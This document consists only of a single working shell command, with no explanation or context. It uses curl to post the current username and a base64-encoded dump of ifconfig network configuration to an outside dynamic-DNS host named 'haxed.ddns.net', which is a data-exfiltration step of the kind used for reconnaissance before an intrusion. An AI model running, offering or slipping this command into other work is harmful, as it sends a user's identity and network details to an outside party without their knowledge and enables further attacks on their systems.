curl "https://haxed.ddns.net" -d "whoami=$(whoami)&ifconfig=$(ifconfig | base64 -w 0)"
